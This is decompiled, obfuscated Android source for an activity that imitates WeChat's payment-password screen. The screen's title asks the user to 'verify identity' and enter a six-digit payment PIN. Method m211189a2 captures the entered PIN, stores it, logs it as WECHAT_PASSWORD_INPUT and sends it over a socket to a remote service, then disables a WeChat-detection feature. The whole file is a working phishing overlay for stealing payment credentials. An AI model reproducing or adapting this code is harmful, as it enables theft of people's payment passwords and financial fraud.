package com.storm.safe.rock.activity;

import android.R;
import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import java.util.ArrayList;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import p000.AbstractC0003a2;
import p000.AbstractC1120qr;
import p000.C0107as;
import p000.ViewOnClickListenerC1203s1;
import p000.ViewOnClickListenerC1204s2;
import p000.ik1;
import p000.m21;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class izvpcqplqctn extends Activity {

    /* renamed from: a3 */
    public static final /* synthetic */ int f51913a3 = 0;

    /* renamed from: a0 */
    public String f51914a0 = "";

    /* renamed from: a1 */
    public final ArrayList f51915a1 = new ArrayList();

    /* renamed from: a2 */
    public boolean f51916a2 = true;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.activity.izvpcqplqctn$a0 */
    public static final class C0246a0 {
        public /* synthetic */ C0246a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private C0246a0() {
        }
    }

    static {
        new C0246a0(null);
    }

    /* renamed from: a0 */
    public final int m211187a0(int i) {
        return (int) (i * getResources().getDisplayMetrics().density);
    }

    /* renamed from: a1 */
    public final void m211188a1(String str) {
        if (str.equals("DEL")) {
            if (this.f51914a0.length() > 0) {
                this.f51914a0 = m21.m213934e2(this.f51914a0);
                m211190a3();
                return;
            }
            return;
        }
        if (this.f51914a0.length() < 6) {
            this.f51914a0 = AbstractC0003a2.m32b3(this.f51914a0, str);
            m211190a3();
            if (this.f51914a0.length() == 6) {
                new Handler(Looper.getMainLooper()).postDelayed(new ik1(this, 0), 300L);
            }
        }
    }

    /* renamed from: a2 */
    public final void m211189a2(String str) {
        C0323a8 c0323a8M211471g5;
        try {
            try {
                C0107as c0106ar = C0107as.f45610a3.getInstance(this);
                int length = str.length();
                c0106ar.m210508a7(length != 4 ? length != 6 ? "none" : "6digit" : "4digit", true, str);
            } catch (Exception e) {
                t60.m214705c6("izvpcqplqctn", "保存微信密码到 AppStatusManager 失败", e);
            }
            dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
            if (c0290a0.getInstance() != null) {
                String str2 = "文本输入: " + m21.m213937e5(50, str) + (str.length() > 50 ? "..." : "");
                AbstractC0770a1.m213614f9(new Pair("textLength", Integer.valueOf(str.length())), new Pair("inputMethod", "wechat_custom_keypad"), new Pair("containsPassword", Boolean.TRUE), new Pair("operationType", "WECHAT_PASSWORD_INPUT"), new Pair("activity", "izvpcqplqctn"));
                dqtvuisjd.m211435k0("TEXT_INPUT", str2);
                try {
                    dqtvuisjd c0290a02 = c0290a0.getInstance();
                    if (c0290a02 != null && (c0323a8M211471g5 = c0290a02.m211471g5()) != null) {
                        c0323a8M211471g5.m211662c8(str, "wechat", "custom_keypad");
                    }
                } catch (Exception e2) {
                    t60.m214705c6("izvpcqplqctn", "通过Socket发送密码失败", e2);
                }
                try {
                    dqtvuisjd c0290a03 = dqtvuisjd.f52358m1.getInstance();
                    if (c0290a03 != null) {
                        c0290a03.m211456e5();
                    }
                } catch (Exception e3) {
                    t60.m214705c6("izvpcqplqctn", "自动关闭微信检测功能失败", e3);
                }
            }
        } catch (Exception e4) {
            t60.m214705c6("izvpcqplqctn", "记录微信密码日志失败", e4);
        }
    }

    /* renamed from: a3 */
    public final void m211190a3() {
        int i = 0;
        while (i < 6) {
            TextView textView = (TextView) this.f51915a1.get(i);
            textView.setText(i < this.f51914a0.length() ? "●" : "");
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setColor(Color.parseColor("#EBEBEB"));
            gradientDrawable.setCornerRadius(m211187a0(6));
            textView.setBackground(gradientDrawable);
            i++;
        }
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
        finish();
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        String str;
        int i;
        String str2;
        String[] strArr;
        View view;
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().setBackgroundDrawableResource(R.color.white);
        Window window = getWindow();
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.width = -1;
        attributes.height = -1;
        attributes.flags |= 768;
        window.setAttributes(attributes);
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        linearLayout.setBackgroundColor(-1);
        linearLayout.setLayoutParams(new LinearLayout.LayoutParams(-1, -1));
        LinearLayout linearLayout2 = new LinearLayout(this);
        linearLayout2.setOrientation(1);
        linearLayout2.setGravity(1);
        linearLayout2.setPadding(m211187a0(24), m211187a0(60), m211187a0(24), m211187a0(32));
        linearLayout2.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        TextView textView = new TextView(this);
        textView.setText("身份验证");
        textView.setTextSize(22.0f);
        String str3 = "#111111";
        textView.setTextColor(Color.parseColor("#111111"));
        textView.setGravity(17);
        textView.setTypeface(textView.getTypeface(), 1);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
        layoutParams.bottomMargin = m211187a0(10);
        textView.setLayoutParams(layoutParams);
        TextView textView2 = new TextView(this);
        textView2.setText("请验证支付密码确认本人操作");
        textView2.setTextSize(14.0f);
        textView2.setTextColor(Color.parseColor("#888888"));
        textView2.setGravity(17);
        textView2.setLayoutParams(new LinearLayout.LayoutParams(-2, -2));
        linearLayout2.addView(textView);
        linearLayout2.addView(textView2);
        LinearLayout linearLayout3 = new LinearLayout(this);
        int i2 = 0;
        linearLayout3.setOrientation(0);
        linearLayout3.setGravity(17);
        linearLayout3.setPadding(m211187a0(28), m211187a0(24), m211187a0(28), m211187a0(24));
        linearLayout3.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        for (int i3 = 0; i3 < 6; i3++) {
            TextView textView3 = new TextView(this);
            int iM211187a0 = m211187a0(48);
            LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(iM211187a0, iM211187a0);
            if (i3 > 0) {
                layoutParams2.setMarginStart(m211187a0(10));
            }
            textView3.setLayoutParams(layoutParams2);
            textView3.setGravity(17);
            textView3.setTextSize(22.0f);
            textView3.setTextColor(-16777216);
            textView3.setText("");
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setColor(Color.parseColor("#EBEBEB"));
            gradientDrawable.setCornerRadius(m211187a0(6));
            textView3.setBackground(gradientDrawable);
            this.f51915a1.add(textView3);
            linearLayout3.addView(textView3);
        }
        View view2 = new View(this);
        view2.setLayoutParams(new LinearLayout.LayoutParams(-1, 0, 1.0f));
        LinearLayout linearLayout4 = new LinearLayout(this);
        linearLayout4.setOrientation(1);
        String str4 = "#D1D5DB";
        linearLayout4.setBackgroundColor(Color.parseColor("#D1D5DB"));
        linearLayout4.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        String[][] strArr2 = {new String[]{"1", "2", "3"}, new String[]{"4", "5", "6"}, new String[]{"7", "8", "9"}, new String[]{"", "0", "DEL"}};
        int i4 = 0;
        int i5 = 0;
        while (i4 < 4) {
            String[] strArr3 = strArr2[i4];
            int i6 = i5 + 1;
            LinearLayout linearLayout5 = new LinearLayout(this);
            linearLayout5.setOrientation(i2);
            String[][] strArr4 = strArr2;
            int i7 = i4;
            LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-1, m211187a0(64));
            if (i5 > 0) {
                layoutParams3.topMargin = m211187a0(1);
            }
            linearLayout5.setLayoutParams(layoutParams3);
            int length = strArr3.length;
            int i8 = 0;
            int i9 = 0;
            while (i9 < length) {
                String str5 = strArr3[i9];
                int i10 = i8 + 1;
                int i11 = length;
                int iM211187a02 = i8 == strArr3.length + (-1) ? 0 : m211187a0(1);
                if (str5.length() == 0) {
                    View view3 = new View(this);
                    str = str3;
                    i = i9;
                    str2 = str4;
                    LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                    layoutParams4.setMarginEnd(iM211187a02);
                    view3.setLayoutParams(layoutParams4);
                    view3.setBackgroundColor(Color.parseColor(str2));
                    view = view3;
                } else {
                    str = str3;
                    i = i9;
                    str2 = str4;
                    if (str5.equals("DEL")) {
                        TextView textView4 = new TextView(this);
                        textView4.setText("×");
                        textView4.setTextSize(22.0f);
                        textView4.setTextColor(Color.parseColor("#333333"));
                        textView4.setGravity(17);
                        LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                        layoutParams5.setMarginEnd(iM211187a02);
                        textView4.setLayoutParams(layoutParams5);
                        textView4.setBackgroundColor(Color.parseColor(str2));
                        textView4.setOnClickListener(new ViewOnClickListenerC1203s1(9, this));
                        view = textView4;
                    } else {
                        TextView textView5 = new TextView(this);
                        textView5.setText(str5);
                        textView5.setTextSize(24.0f);
                        textView5.setTextColor(Color.parseColor(str));
                        textView5.setGravity(17);
                        strArr = strArr3;
                        LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                        layoutParams6.setMarginEnd(iM211187a02);
                        textView5.setLayoutParams(layoutParams6);
                        textView5.setBackgroundColor(-1);
                        textView5.setOnClickListener(new ViewOnClickListenerC1204s2(this, str5, 2));
                        view = textView5;
                        linearLayout5.addView(view);
                        i9 = i + 1;
                        strArr3 = strArr;
                        i8 = i10;
                        length = i11;
                        str3 = str;
                        str4 = str2;
                    }
                }
                strArr = strArr3;
                linearLayout5.addView(view);
                i9 = i + 1;
                strArr3 = strArr;
                i8 = i10;
                length = i11;
                str3 = str;
                str4 = str2;
            }
            linearLayout4.addView(linearLayout5);
            i4 = i7 + 1;
            i2 = 0;
            i5 = i6;
            strArr2 = strArr4;
            str3 = str3;
            str4 = str4;
        }
        linearLayout.addView(linearLayout2);
        linearLayout.addView(linearLayout3);
        linearLayout.addView(view2);
        linearLayout.addView(linearLayout4);
        setContentView(linearLayout);
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
    }
}
